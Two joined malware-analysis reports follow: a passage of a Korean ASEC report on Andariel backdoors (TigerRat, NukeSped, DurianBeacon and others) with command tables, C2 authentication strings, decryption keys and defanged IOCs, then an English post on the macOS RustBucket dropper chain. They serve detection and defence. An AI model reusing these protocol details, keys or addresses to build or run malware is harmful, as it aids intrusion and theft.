이에 따라 위 악성코드를 Volgmer 유형으로 분류하기에는 한계가 있어 NukeSped 변종으로 분류한다. 기본적인 기능만을 제공하는 상대적으로 단순한 형태의 백도어이며 자가 삭제 과정에서 사용되는 Batch 스크립트가 기존 NukeSped 유형과 유사한 점이 특징이다.
 Figure 3. 자가 삭제 과정에서 사용되는 Batch 스크립트

1.1.2. ANDARDOOR
닷넷으로 개발되었으며 TestProgram이라는 이름을 갖는 백도어 악성코드이다. 자사 진단명을 기반으로 Andardoor로 분류하며 Dotfuscator 도구를 이용해 난독화된 것이 특징이다. 파일 작업, 프로세스 작업, 명령 실행, 스크린샷 캡쳐 등 감염 시스템을 제어할 수 있는 여러 기능들을 지원한다. C&C 서버와의 통신에는 SSL을 이용한 암호화가 사용되며 서버 이름으로 “clientName”이라는 문자열을 지정하였다.
 Figure 4. C&C 서버와의 SSL 통신 루틴

1.1.3. 1TH TROY REVERSE SHELL
1th Troy는 Go 언어로 개발된 Reverse Shell 악성코드이다. 바이너리에 포함된 다음 문자열을 통해 악성코드가 “Reverse_Base64_Pipe”라는 단순한 이름이며 악성코드 제작자는 이를 “1th Troy”로 분류한 것을 확인할 수 있다.
G:/Code/01__1th Troy/Go/Reverse_Base64_Pipe/Client/client.go
기본적인 명령만을 제공하는 Reverse Shell 답게 지원하는 명령은 “cmd”, “exit”, “self delete”가 있으며, 각각 명령 실행, 프로세스 종료, 자가 삭제 기능을 지원한다.
 Figure 5. 단순한 형태의 리버스 쉘

1.2. 국내 기업 공격 사례
Andariel 그룹은 2023년 3월에도 국내 방산 업체 및 전자 장비 업체를 공격하여 악성코드들을 유포하였다. 최초 침투 방식은 확인되지 않지만 자사 AhnLab Smart Defense (ASD) 인프라를 통해 mshta.exe 프로세스가 TigerRat을 설치한 로그와 mshta.exe 프로세스를 종료시키는 로그가 확인된다. 이는 스크립트 악성코드를 통해 설치된 것을 의미하며 스피어 피싱 공격이 사용된 것으로 보인다.
 Figure 6. TigerRAT을 설치하는 mshta 프로세스
공격에 사용된 악성코드들은 주로 백도어이며 과거부터 Andariel 그룹이 사용하는 TigerRat이 함께 사용되었다.

1.2.1. TIGERRAT
TigerRat은 과거 한국인터넷진흥원(KISA)에서 이름붙인 RAT 악성코드로서 [8] 2020년 경부터 최근까지 Andariel 위협 그룹이 공격에 꾸준히 사용하고 있다. 일반적으로 스피어 피싱 메일에 첨부된 악성 매크로 문서 파일이나 워터링 홀 공격을 통해 유포된 것으로 알려져 있다. [9] Andariel 그룹은 취약한 버전의 VMware Horizon 제품을 사용하는 국내 기업을 대상으로 Log4Shell 취약점 공격을 수행해 TigerRat을 설치한 사례도 존재한다. [10]
TigerRat은 파일 작업, 명령 실행과 같은 기본적인 기능들 외에도 정보 수집, 키로깅, 스크린 캡쳐, 포트 포워딩 등 다양한 기능들을 지원하는 백도어 악성코드로서 C&C 서버와 최초로 통신할 때 인증 과정이 존재하는 것이 특징이다. 과거 버전에서는 인증 시 다음과 같이 SSL 통신을 위장한 문자열을 사용하였다. 악성코드에 따라 “HTTP 1.1 /member.php SSL3.4” 또는 “HTTP 1.1 /index.php?member=sbi2009 SSL3.3.7” 문자열을 C&C 서버에 전달한 이후 C&C 서버로부터 “HTTP 1.1 200 OK SSL2.1” 문자열을 전달받을 경우에만 인증에 성공한다.
 Figure 7. C&C 서버와의 인증에 사용된 문자열 – 과거 버전
하지만 이번에 확인된 TigerRAT은 다음과 같이 랜덤한 0x20 크기의 문자열이 사용된다. 해당 문자열들은 “fool”(dd7b696b96434d2bf07b34f9c125d51d), “iwan”(01ccce480c60fcdb67b54f4509ffdb56)에 대한 MD5 해시로 추정되며, 공격자는 네트워크 진단을 우회하기 위해 인증 과정에서 랜덤한 문자열을 사용한 것으로 보인다.
 Figure 8. C&C 서버와의 인증에 사용된 문자열 – 최신 버전
•	C&C 요청 문자열 : dd7b696b96434d2bf07b34f9c125d51d
•	C&C 응답 문자열 : 01ccce480c60fcdb67b54f4509ffdb56

1.2.2. BLACK RAT
Black RAT은 공격자가 제작한 것으로 추정되는 백도어 악성코드로서 다른 악성코드들처럼 Go 언어로 제작되었다. 이전 공격에서 확인된 1th Troy 리버스 쉘은 단순한 명령 실행 기능만 지원하지만 Black RAT은 명령 실행 외에도 파일 다운로드, 스크린 캡쳐와 같은 다양한 기능들을 지원한다.
 Figure 9. Black RAT이 지원하는 기능들
바이너리에 포함된 다음 문자열을 보면 악성코드 제작자가 해당 악성코드를 RAT으로 분류하였으며 이름을 Black으로 지정한 것을 알 수 있다.
I:/01___Tools/02__RAT/Black/Client_Go/Client.go

1.2.3. NUKESPED 변종
해당 공격에서도 전형적인 NukeSped 백도어가 사용되었다. 지원하는 기능은 네트워크 스캐닝, 프로세스 및 파일 조회, 파일 업로드 / 다운로드, 명령 실행 등이 있다. 사용할 API들의 이름은 다음과 같이 암호화되어 있으며 이를 복호화한 이후에 직접 구해서 사용한다. 복호화에는 0x26 사이즈의 키가 사용된다.
 Figure 10. 난독화된 API 문자열
•	복호화에 사용되는 키 값 : i<6fu>-0|HSLRCqd.xHqMB]4H#axZ%5!5!?SQ&
해당 NukeSped 변종에서도 자가 삭제를 위한 Batch 스크립트가 사용되는데 이전 공격에서 사용된 유형과는 약간의 차이가 존재한다.
 Figure 11. 자가 삭제 과정에서 사용되는 Batch 스크립트
확인된 NukeSped 변종은 두 종류인데 각각 Reverse Shell 방식과 Bind Shell 방식이다. Bind Shell형태도 Reverse Shell 형태와 동일하게 사용하는 포트 즉 Listen하는 포트 번호는 10443번이다. 해당 NukeSped는 TigerRat과 유사하게 C&C 서버와 통신하기 이전에 인증 과정을 거치는데, TigerRat이 SSL 통신을 위장하였다면 NukeSped는 HTTP 통신을 위장하였다. 즉 아래와 같은 POST 요청을 전송한 후 정확히 매칭되는 HTTP 응답이 올 때에만 C&C 서버와 통신을 진행한다.
 Figure 12. 인증에 사용되는 HTTP 패킷

2. 최근 공격 사례
ASEC에서는 Andariel 그룹의 공격을 모니터링하고 있으며 최근 Innorix Agent가 악성코드를 설치하는데 악용되고 있는 사례를 확인하였다. Innorix Agent가 악성코드를 다운로드하는 방식이었던 이전 사례와 달리 직접 생성하는 방식이기 때문에 취약점 공격인지는 알 수 없으며 단순하게 악용된 것일 수 있다.
해당 공격에서 확인된 악성코드들은 기존에 Andariel 그룹이 사용한 유형은 아니지만 Innorix가 공격에 사용된 점 외에도 공격 대상이 국내 대학교들인 점은 과거 공격 사례와 유사하다. 이외에도 비슷한 시점에 국내 ICT 기업과 전자 장비 업체, 조선, 제조업 등 다양한 기업들을 대상으로 한 공격 사례가 확인되었으며 분석 결과 Innorix 악용 공격 사례에서 사용된 악성코드들과의 연관성을 확인할 수 있었다.
여기에서는 먼저 각각의 공격 사례와 공격 과정에서 사용된 악성코드들을 분석한다. 이후 각각의 공격 사례를 동일한 공격자의 소행으로 보고 있는 근거를 정리한 이후 해당 공격들과 과거 Andariel 위협 그룹의 공격 사례들과의 연관성을 정리한다.

2.1. Innorix Agent 악용 사례
2.1.1. GOAT RAT
최근 국내 대학교들을 대상으로 한 공격에서 Innorix Agent가 악성코드를 설치했던 사례가 확인되었다. Innorix Agent는 “iexplorer.exe”라는 이름으로 악성코드를 설치하였는데 이는 과거부터 Andariel 그룹이 자주 사용하는 이름들 중 하나이다.
 Figure 13. Innorix Agent를 악용하여 Goat RAT을 설치
공격에 사용된 악성코드는 Go 언어로 개발된 악성코드이며 다음과 같은 같은 원본 소스 코드 정보를 확인할 수 있다.
E:/Projects/Malware/6_Goat_23/Goat/Goat.go
E:/Projects/Malware/6_Goat_23/Goat/define.go
E:/Projects/Malware/6_Goat_23/Goat/anti-vaccine.go
E:/Projects/Malware/6_Goat_23/Goat/command.go
비록 이전 공격에 사용된 Go 기반 백도어 악성코드들과 달리 난독화되어 있지만 기본적인 파일 작업이나 자가 삭제와 같은 기능들을 확인할 수 있으며, 실제 다음과 같은 명령들을 실행한 로그도 확인된다.
> cmd /c tasklist
> cmd /c ipconfig /all
 Figure 14. 난독화된 함수 이름

2.2. 국내 기업 공격 사례
2.2.1. ANDARLOADER
ASEC에서는 Innorix Agent를 악용한 공격 사례와 별개로 유사한 시점에 또 다른 공격을 확인하였다. 최초 유포 경로는 확인되지 않지만 공격에 사용된 악성코드는 위에서 Andardoor로 분류한 닷넷 악성코드와 동일하게 Dotfuscator 도구를 이용해 난독화되었으며 C&C 서버와 SSL 통신을 하는 점도 동일하다. C&C 서버와 연결 시에는 “clientName”를 사용했던 Andardoor와 달리 “sslClient” 문자열이 사용된다.
 Figure 15. C&C 서버와의 SSL 연결 과정
대부분의 기능들이 직접 구현되어 있던 Andardoor 악성코드와 달리 해당 악성코드는 외부에서 닷넷 어셈블리와 같은 실행 가능한 데이터를 받아 실행하는 다운로더 기능이 전부이다. C&C 서버로부터 전달받은 명령들 중 다음과 같은 명령에 따라 전달받은 코드를 실행하거나 종료할 수 있다. 공격자가 AndarLoader를 이용해 수행한 행위 중에는 미미카츠를 감염 시스템에 설치하는 로그도 확인된다.
분석 당시에는 C&C 서버와 연결이 불가하여 실질적인 기능을 담당하는 부분은 확인하지 못했기 때문에 기존 Andardoor와의 직접적인 유사성은 확인되지 않지만 동일한 난독화 도구를 사용한 점이나 C&C 서버와의 통신 과정이 유사하여 여기에서는 AndarLoader 유형으로 분류하였다.
명령	기능
alibaba	다운로드한 닷넷 어셈블리 실행
facebook	다운로드한 닷넷 메쏘드 실행
exit	종료
vanish	자가 삭제 및 종료
Table 1. 수행 가능한 명령 목록
AndarLoader가 공격자의 명령을 받아 실행한 명령들 중에는 mshta.exe 프로세스를 종료시키는 명령이 존재한다. AndarLoader가 파워쉘을 이용해 설치된 점이나 mshta.exe 프로세스와 관련된 점을 보면 최초 유입 경로가 위에서 다룬 공격 사례처럼 스피어 피싱 공격일 가능성을 보여준다.
 Figure 16. AndarLoader가 실행한 명령
참고로 AndarLoader에 감염된 시스템에는 다음과 같이 mshta.exe 프로세스가 C&C 서버에 접속하는 로그도 함께 확인된다.
 Figure 17. 네트워크 통신 로그
C&C 주소 및 다운로드 주소로 kro.kr 도메인이 사용되었는데 이는 일반적으로 Kimsuky 위협 그룹에서 자주 사용하는 도메인이다. 또한 공격 과정에서 RDP 연결을 위해 Ngrok를 설치한 점도 Kimsuky 위협 그룹의 공격 패턴과 유사하다.
 Figure 18. 설치한 Ngrok를 실행하는 로그

2.2.2. DURIANBEACON
AndarLoader 악성코드를 조사하던 중 공격 과정에서 DurianBeacon이라는 이름의 악성코드가 함께 사용된 것이 확인되었다. DurianBeacon은 Go 언어로 개발된 형태와 Rust 언어로 개발된 형태 2가지가 확인되며, 모두 백도어 악성코드로서 C&C 서버로부터 공격자의 명령을 받아 악성 행위를 수행할 수 있다.

A. GO 버전
바이너리에 포함된 다음 문자열을 통해 악성코드 제작자가 해당 악성코드를 DurianBeacon이라는 이름으로 제작한 것을 알 수 있다.
G:/Dev/Go/DurianBeacon/Command.go
G:/Dev/Go/DurianBeacon/SSL.go
G:/Dev/Go/DurianBeacon/Utils.go
G:/Dev/Go/DurianBeacon/main.go
Go 언어로 개발된 DurianBeacon은 C&C 서버와의 통신 시 SSL 프로토콜을 사용한다. 최초 접속 이후 감염 시스템의 IP 정보, 사용자 이름, 데스크탑 이름, 아키텍처, 파일명을 전송한 후 명령을 대기하며 명령 전달 시 결과를 반환한다. 지원하는 기능들 중에는 감염 시스템의 기본적인 정보를 수집하는 기능 외에 파일 다운로드 / 업로드, 조회, 명령 실행 등의 기능들이 존재한다.
 Figure 19. DurainBeacon이 지원하는 기능들
SSL 프로토콜을 이용하기 때문에 통신 패킷은 암호화되어 있지만 내부적으로는 다음과 같은 패킷 구조가 사용된다.
오프셋	사이즈	설명
0x00	0x04	명령 번호
0x04	0x04	명령 인자의 사이즈
0x08	가변	명령 인자
Table 2. DurianBeacon의 명령 패킷 구조
각각의 명령 번호에 해당하는 기능들은 다음과 같다.
명령	기능
0x00	Hibernate
0x01	Interval
0x02	명령 실행 (결과 반환)
0x03	디렉터리 조회
0x04	드라이브 정보
0x05, 0x06, 0x07, 0x08	파일 업로드
0x09, 0x0A, 0x0B	파일 다운로드
0x0C	디렉터리 생성
0x0D	파일 삭제
0x0E	명령 실행
0x0F	종료
Table 3. DurianBeacon의 명령 목록
명령 실행 이후에는 성공 여부나 명령 실행 결과를 C&C 서버에 전달하는데, 응답 또한 명령 패킷과 유사하다.
오프셋	사이즈	설명
0x00	0x04	응답 번호
0x04	0x04	명령 실행 결과의 사이즈
0x08	가변	명령 실행 결과
Table 4. DurianBeacon의 응답 패킷 구조
응답	설명
0x00	명령 결과 반환
0x01, 0x02, 0x03	디렉터리 조회 (시작, 종료 등)
0x04	드라이브 정보
0x05, 0x06, 0x07	파일 업로드 (에러, 성공 등)
0x08, 0x09, 0x0A	파일 다운로드 (에러, 성공 등)
0x0B, 0x0C	디렉터리 생성 (실패, 성공)
0x0D, 0x0E	파일 삭제 (실패, 성공)
0x0F, 0x10	명령 실행 (실패, 성공)
Table 5. DurianBeacon의 응답 목록

B. RUST 버전
연관 파일들을 조사하던 중 Rust 언어로 만들어진 DurianBeacon 또한 공격에 사용된 것을 확인하였다.
•	PDB 정보 : C:\Users\Anna\Documents\DurianBeacon\target\x86_64-pc-windows-msvc\release\deps\DurianBeacon.pdb
DurianBeacon은 C&C 서버와의 통신 방식들 중 SSL 외에 XOR을 이용한 패킷 암호화를 지원하며 키는 0x57이다.
 Figure 20. XOR 암호화를 지원하는 Rust 버전의 DurianBeacon
Go 버전과 비교했을 때 패킷 구조 및 명령 또한 동일하다. Rust 버전의 DurianBeacon은 최초 접속 이후 “durian2023” 키워드와 함께 감염 시스템의 IP 정보, 사용자 이름, 데스크탑 이름, 아키텍처, 파일명을 전송한 후 명령을 대기하며 명령 전달 시 결과를 반환한다.
 Figure 21. Rust 버전의 통신 패킷 – 테스트

3. 최근 공격 사례들의 연관성
위 항목에서 최근 확인된 두 개의 공격 즉 Innorix Agent를 악용해 국내 대학교를 공격한 사례와 스피어 피싱으로 추정되는 공격을 통해 국내 기업들에 악성코드를 설치한 사례들을 다루었다. 여기에서는 두 종류의 공격을 동일한 공격자의 소행으로 추정하고 있는 근거를 정리한다.
먼저 자사 ASD 로그를 통해 특정 시스템에서 Durian, Goat RAT, AndarLoader 악성코드가 유사한 시점에 함께 수집된 사례가 존재한다. 해당 시스템은 공격자의 테스트 PC로 추정되는데 AndarLoader 악성코드의 경로명이 다음과 같았기 때문이다.
•	AndarLoader의 수집 경로 : d:\01__developing\99__c#_obfuscated\runtime broker.exe
이외에도 백도어 악성코드들의 C&C 서버가 공유된 사례도 존재한다. 공격자가 Innorix Agent를 악용해 악성코드를 설치할 때 대부분 Goat RAT이 사용되었지만 또 다른 악성코드가 설치된 사례도 일정 비율로 존재한다. 해당 악성코드는 비록 수집되지는 않았지만 C&C 서버와의 통신 로그가 남아있으며 해당 주소는 다른 공격에서 사용된 DurianBeacon의 C&C 주소와 동일하였다.
 Figure 22. Innorix Agent를 통해 설치된 악성코드의 C&C 통신 로그
마지막으로 DurianBeacon이 AndarLoader를 설치한 로그도 확인할 수 있었다. 즉 해당 공격들은 유사한 시점에 발생하였으며 각각의 악성코드들이 설치 과정에서 또는 사용하는 C&C 서버의 주소에서 연관성을 보이고 있다.
 Figure 23. DurianBeacon이 AndarLoader를 생성한 로그

4. Andariel 그룹의 과거 공격 사례들과의 연관성
최근 확인된 두 개의 공격 사례는 동일한 공격자의 소행으로 추정된다. 여기에서는 해당 공격들과 Andariel 위협 그룹과의 연관성을 확인한다.
A. 공격 대상
•	국내 대학교와 방산, 전자 장비, ICT 업체 등을 대상으로 공격
B. 공격 방식
•	이전 사례와 동일하게 Innorix Agent 악용
•	이전 사례와 동일하게 스피어 피싱 공격으로 추정되는 정황 확인
•	악성코드 설치 시 사용한 경로 및 파일명의 유사성
C. 사용된 악성코드
•	Go 언어로 제작된 악성코드들의 사용
•	Andardoor 악성코드와 AndarLoader 악성코드의 유사성
•	과거 공격에 사용한 정보 탈취 악성코드와 유사한 악성코드 확인
먼저 공격 대상이 되는 분야가 기존의 공격 사례에서 확인된 대상과 동일하다는 점과 이전 공격에서 확인된 공격 방식들이 동일하게 사용되었다는 점이 있다. Innorix Agent를 악용한 사례는 직접 확인되었으며 추정이긴 하지만 여러 로그들을 통해 스피어 피싱 공격이 사용된 것으로 보이는 정황들도 확인된다.
그리고 악성코드 설치 시 사용된 “iexplorer.exe”라는 이름이 훨씬 이전 Andariel 공격 사례에서부터 확인되고 있다는 점이다. “iexplorer.exe” 외에도 “authsvc.exe”, “creditsvc.exe”와 같이 “svc” 키워드가 포함된 이름도 과거부터 꾸준히 사용되고 있다. 위의 과거 사례에서 사용된 “mainsvc.exe”, “certsvc.exe” 외에도 “netsvc.exe”라는 이름이나 “srvcredit.exe” 같은 유사한 이름이 사용된 사례들도 존재한다.
AndarLoader는 해당 항목에서 다루었다시피 이전 공격에서 사용된 Andardoor와 동일한 도구인 Dotfuscator의 평가판 버전으로 난독화되었으며 C&C 서버와의 통신 방식도 SSL 암호화를 사용한다는 점에서 유사한 것을 알 수 있다. 이외에도 Go 언어로 개발된 악성코드가 2개나 사용되었는데 이는 1th Troy Reverse Shell , Black RAT 등 올해 초부터 지속적으로 Go 언어로 개발된 악성코드가 사용되고 있는 흐름과도 맞아떨어진다.
마지막으로 공격자의 테스트 PC로 추정되는 시스템과 실제 공격 사례에서 직접 제작한 것으로 추정되는 정보 탈취형 악성코드들이 사용되었다는 점이 있다. 과거 사례에서도 Andariel 그룹은 공격 과정 중 계정 정보 탈취를 전담하는 악성코드를 설치하여 인터넷 익스플로러나 크롬, 파이어폭스 웹 브라우저 등에 저장된 계정 정보를 탈취하였다. 해당 악성코드는 커맨드 라인 도구로서 추출한 계정 정보를 커맨드 라인으로 출력하였으며 공격자는 백도어를 이용해 결과를 C&C 서버에 전달하였을 것으로 추정된다.
 Figure 24. 과거 공격 사례에서 확인된 정보 탈취 악성코드
최근 공격에 사용된 정보 탈취형 악성코드도 이와 유사한 형태이며 차이점이 있다면 웹 브라우저들만을 정보 탈취 대상으로 하고 계정 정보뿐만 아니라 히스토리까지 탈취 대상으로 한다는 점이 있다. 이외에도 커맨드 라인으로 출력했던 과거와 달리 탈취한 정보를 동일한 경로에 “error.log”라는 이름의 파일로 생성한다.
 Figure 25. 최근 공격 사례에서 확인된 정보 탈취 악성코드

5. 결론
Andariel 그룹은 Kimsuky, Lazarus 그룹과 함께 국내를 대상으로 활발하게 활동하고 있는 위협 그룹들 중 하나이다. 초기에는 주로 안보와 관련된 정보를 획득하기 위해 공격을 전개하였지만 이후에는 금전적 이득을 목적으로 한 공격도 수행하고 있다. [11] 초기 침투 시 주로 스피어 피싱 공격이나 워터링 홀 공격 그리고 소프트웨어의 취약점을 이용하는 것으로 알려져 있으며 공격 과정에서 다른 취약점을 이용해 악성코드를 배포하는 정황도 확인되고 있다.
사용자들은 출처가 불분명한 메일의 첨부 파일이나 웹 페이지에서 다운로드한 실행 파일은 각별히 주의해야 한다. 그리고 OS 및 인터넷 브라우저 등의 프로그램들에 대한 최신 패치 및 V3를 최신 버전으로 업데이트하여 이러한 악성코드의 감염을 사전에 차단할 수 있도록 신경 써야 한다.
파일 진단
– Backdoor/Win.Agent.R562183 (2023.03.14.00)
– Backdoor/Win.Andardoor.C5381120 (2023.02.16.01)
– Backdoor/Win.Andardoor.R558252 (2023.02.16.01)
– Backdoor/Win.AndarGodoor.C5405584 (2023.04.05.03)
– Backdoor/Win.DurianBeacon.C5472659 (2023.08.18.02)
– Backdoor/Win.DurianBeacon.C5472662 (2023.08.18.02)
– Backdoor/Win.DurianBeacon.C5472665 (2023.08.18.03)
– Backdoor/Win.Goat.C5472627 (2023.08.18.02)
– Backdoor/Win.Goat.C5472628 (2023.08.18.02)
– Backdoor/Win.Goat.C5472629 (2023.08.18.02)
– Backdoor/Win.NukeSped.C5404471 (2023.04.03.02)
– Backdoor/Win.NukeSped.C5409470 (2023.04.12.00)
– Backdoor/Win.NukeSped.C5409543 (2023.04.12.00)
– Infostealer/Win.Agent.C5472631 (2023.08.18.02)
– Trojan/Win.Agent.C5393280 (2023.03.11.00)
– Trojan/Win.Agent.C5451550 (2023.07.11.00)
– Trojan/Win.Andarinodoor.C5382101 (2023.02.16.01)
– Trojan/Win.Andarinodoor.C5382103 (2023.02.16.01)
– Trojan/Win32.RL_Mimikatz.R366782 (2021.02.18.01)
행위 진단
– Suspicious/MDP.Download.M1004
– Infostealer/MDP.Behavior.M1965
IOC
MD5
– 0a09b7f2317b3d5f057180be6b6d0755 : NukeSped 변종 – Volgmer (%SystemRoot%\mstc.exe.irx)
– 1ffccc23fef2964e9b1747098c19d956 : NukeSped 변종 – Volgmer (%SystemRoot%\msnox.exe.irx)
– 9112efb49cae021abebd3e9a564e6ca4 : NukeSped 변종 – Volgmer (%SystemRoot%\system32\mscert.exe)
– bcac28919fa33704a01d7a9e5e3ddf3f : NukeSped 변종 – Volgmer (%SystemRoot%\msnoxe.exe.irx)
– ac0ada011f1544aa3a1cf27a26f2e288 : Andardoor (%SystemDrive%\users\%ASD%\msdes.exe.irx)
– c892c60817e6399f939987bd2bf5dee0 : Andardoor (%SystemDrive%\users\%ASD%\msdes.exe.irx)
– 0211a3160cc5871cbcd4e5514449162b : Andardoor (%SystemDrive%\users\%ASD%\msdes.exe.irx)
– e5410abaaac69c88db84ab3d0e9485ac : 1st Troy Reverse Shell (%SystemRoot%\msnox.exe.irx)
– 88a7c84ac7f7ed310b5ee791ec8bd6c5 : 1st Troy Reverse Shell (%SystemRoot%\msnox.exe.irx)
– eb35b75369805e7a6371577b1d2c4531 : TigerRat (%SystemRoot%\system32\hl_cl.exe)
– 5a3f3f75048b9cec177838fb8b40b945 : TigerRat (%SystemDrive%\users\%ASD%\larabar.exe, %SystemDrive%\users\%ASD%\mainsvc.exe, %SystemDrive%\users\%ASD%\certsvc.exe)
– 9d7bd0caed10cc002670faff7ca130f5 : Black RAT (%SystemRoot%\syswow64\mbcbuilder.exe, %SystemRoot%\syswow64\msinfo.exe)
– 8434cdd34425916be234b19f933ad7ea : Black RAT (%SystemRoot%\system32\shamon.exe)
– bbaee4fe73ccff1097d635422fdc0483 : NukeSped 변종 (%SystemDrive%\users\%ASD%\update.exe)
– 79e474e056b4798e0a3e7c60dd67fd28 : NukeSped 변종 (%SystemRoot%\hl_cl.exe)
– 3ec3c9e9a1ad0e6a6bd75d00d616936b : Goat RAT (%SystemDrive%\users\%ASD%\downloads\iexplore.exe)
– 95c276215dcc1bd7606c0cb2be06bf70 : Goat RAT (%SystemDrive%\users\%ASD%\downloads\iexplore.exe)
– 426bb55531e8e3055c942a1a035e46b9 : Goat RAT (%SystemDrive%\users\%ASD%\downloads\iexplore.exe)
– cfae52529468034dbbb40c9a985fa504 : Goat RAT (%SystemDrive%\users\%ASD%\downloads\iexplore.exe)
– deae4be61c90ad6d499f5bdac5dad242 : Goat RAT (%SystemDrive%\users\%ASD%\downloads\iexplore.exe)
– 6ab4eb4c23c9e419fbba85884ea141f4 : AndarLoader (SystemDrive%\users\%ASD%\pictures\runtime broker.exe, %SystemRoot%\system32\authsvc.exe, %SystemRoot%\system32\creditsvc.exe, %ProgramFiles%\smartplant\svchost.exe)
– bda0686d02a8b7685adf937cbcd35f46 : DurianBeacon Go (a.exe)
– 6de6c27ca8f4e00f0b3e8ff5185a59d1 : DurianBeacon Go (%SystemDrive%\users\%ASD%\pictures\xxx.exe)
– c61a8c4f6f6870c7ca0013e084b893d2 : DurianBeacon Rust (%SystemDrive%\users\%ASD%\documents\d.exe)
– 5291aed100cc48415636c4875592f70c : Mimikatz (%SystemDrive%\users\%ASD%\mimi.exe)
– f4795f7aec4389c8323f7f40b50ae46f : 계정 정보 수집 악성코드 (%SystemDrive%\users\%ASD%\documents\mshelp.exe)
다운로드 주소
– hxxp://27.102.113[.]88/client.exe : NukeSped 변종 – Volgmer
– hxxp://27.102.107[.]230/mstcs.exe : NukeSped 변종 – Volgmer
– hxxp://27.102.107[.]233/update.exe : NukeSped 변종 – Volgmer
– hxxp://27.102.107[.]233/client.exe : NukeSped 변종 – Volgmer
– hxxp://27.102.107[.]234/update.exe : NukeSped 변종 – Volgmer
– hxxp://27.102.107[.]235/mstcs.exe : NukeSped 변종 – Volgmer
– hxxp://139.177.190[.]243/update.exe : Andardoor
– hxxp://4.246.144[.]112/update.exe : Andardoor
– hxxp://27.102.113[.]88/update.exe : 1st Troy Reverse Shell
– hxxp://27.102.107[.]224/update.exe : 1st Troy Reverse Shell
– hxxp://27.102.107[.]230/update.exe : 1st Troy Reverse Shell
– hxxp://www.ipservice.kro[.]kr/dataSeq.exe : AndarLoader
– hxxp://www.ipservice.kro[.]kr/creditsvc.exe : AndarLoader
C&C 주소
– 27.102.113[.]88:5443 : NukeSped 변종 – Volgmer
– 27.102.107[.]234:8443 : NukeSped 변종 – Volgmer
– 27.102.107[.]224:5443 : NukeSped 변종 – Volgmer
– 109.248.150[.]179:443 : NukeSped 변종 – Volgmer
– 139.177.190[.]243:443 : Andardoor
– 4.246.144[.]112:443 : Andardoor
– 27.102.113[.]88:21 : 1st Troy Reverse Shell
– 27.102.107[.]224:8443 : 1st Troy Reverse Shell
– 4.246.149[.]227:8080 : TigerRat
– 13.76.133[.]68:8080 : TigerRat
– 217.195.153[.]233:443 : TigerRat
– bbs.topigsnorsvin.com[.]ec:8080 : Black RAT
– 27.102.129[.]196:8088 : Black RAT
– 13.76.133[.]68:10443 : NukeSped 변종
– 46.183.223[.]21:8080 : Goat RAT
– chinesekungfu[.]org:443 : AndarLoader
– privatemake.bounceme[.]net:443 : AndarLoader
– 8.213.128[.]76:1012 : DurianBeacon Go
연관 IOC 및 관련 상세 분석 정보는 안랩의 차세대 위협 인텔리전스 플랫폼 ‘AhnLab TIP’ 구독 서비스를 통해 확인 가능하다.
 
BlueNoroff | How DPRK’s macOS RustBucket Seeks to Evade Analysis and Detection
July 5, 2023
by Phil Stokes
PDF
Back in April, researchers at JAMF detailed a sophisticated APT campaign targeting macOS users with multi-stage malware that culminated in a Rust backdoor capable of downloading and executing further malware on infected devices. ‘RustBucket’, as they labeled it, was attributed with strong confidence to the BlueNoroff APT, generally assumed to be a subsidiary of the wider DPRK cyber attack group known as Lazarus.
In May, ESET tweeted details of a second RustBucket variant targeting macOS users, followed in June by Elastic’s discovery of a third variant that included previously unseen persistence capabilities.
RustBucket is noteworthy for the range and type of anti-evasion and anti-analysis measures seen in various stages of the malware. In this post, we review the multiple malware payloads used in the campaign and highlight the novel techniques RustBucket deploys to evade analysis and detection.
 
RustBucket Stage 1 | AppleScript Dropper
The attack begins with an Applet that masquerades as a PDF Viewer app. An Applet is simply a compiled AppleScript that is saved in a .app format. Unlike regular macOS applications, Applets typically lack a user interface and function merely as a convenient way for developers to distribute AppleScripts to users.
The threat actors chose not to save the script as run-only, which allows us to easily decompile the script with the built-on osadecompile tool (this is, effectively, what Apple’s GUI Script Editor runs in the background when viewing compiled scripts).
 Stage 1 executes three ‘do shell script’ commands to set up Stage 2
The script contains three do shell script commands, which serve to download and execute the next stage. In the variant described by JAMF, this was a barebones PDF viewer called  Internal PDF Viewer. We will forgo the details here as researchers have previously described this in detail.
Stage 1 writes the second stage to the /Users/Shared/ folder, which does not require permissions and is accessible to malware without having to circumvent TCC. The Stage 1 variant described by Elastic differs in that it writes the second stage as a hidden file to /Users/Shared/.pd.
The Stage 1 is easily the least sophisticated and easily detected part of the attack chain. The arguments of the do shell script commands should appear in the Mac’s unified logs and as output from command line tools such as the ps utility.
Success of the Stage 1 relies heavily on how well the threat actor employs social engineering tactics. In the case described by JAMF, the threat actors used an elaborate ruse of requiring an “internal” PDF reader to read a supposedly confidential or ‘protected’ document. Victims were required to execute the Stage 1 believing it to be capable of reading the PDF they had received. In fact, the Stage 1 was only a dropper, designed to protect the Stage 2 should anyone without the malicious PDF stumble on it.
RustBucket Stage 2 | Payloads Written in Swift and Objective-C
We have found a number of different Stage 2 payloads, some written in Swift, some in Objective-C, and both compiled for Intel and Apple silicon architectures (see IoCs at the end of the post). The sizes and code artifacts of the Stage 2 samples vary. The universal ‘fat’ binaries vary between 160Kb and 210Kb.
 Samples of RustBucket Stage 2 vary in size
Across the samples, various username strings can be found. Those we have observed in Stage 2 binaries so far include:
/Users/carey/
/Users/eric/
/Users/henrypatel/
/Users/hero/
Despite the differences in size and code artifacts, the Stage 2 payloads have in common the task of retrieving the Stage 3 from the command and control server. The Stage 2 payload requires a specially-crafted PDF to unlock the code which would lead to the downloading of the Stage 3 and provide an XOR’d key to decode the obfuscated C2 appended to the end of the PDF.
In some variants, this data is executed in the downAndExecute function as described by previous researchers; in others, we note that download of the next stage is performed in the aptly-named down_update_run function. This function itself varies across samples. In b02922869e86ad06ff6380e8ec0be8db38f5002b, for example, it runs a hardcoded command via system().
 Stage 2 executes a shell command via the system() call to retrieve and run Stage 3
However, the same function in other samples, (e.g., d5971e8a3e8577dbb6f5a9aad248c842a33e7a26) use NSURL APIs and entirely different logic.
 Code varies widely among samples, possibly suggesting different developers
Researchers at Elastic noted, further, that in one newer variant of Stage 2 written in Swift, the User-Agent string is all lowercase, whereas in the earlier Objective-C samples they are not.
 User-Agent string is subtly changed from the Objective-C to Swift versions of Stage 2
Although User-Agent strings are not inherently case sensitive, if this was a deliberate change it is possible the threat actors are parsing the User-Agent strings on the server side to weed out unwanted calls to the C2. That said, sloppiness around case-sensitivity is seen elsewhere in RustBucket samples (e.g., “/users/shared” in Stage 1), and the case variance may be no more than a product of different developers with different standards of rigor.
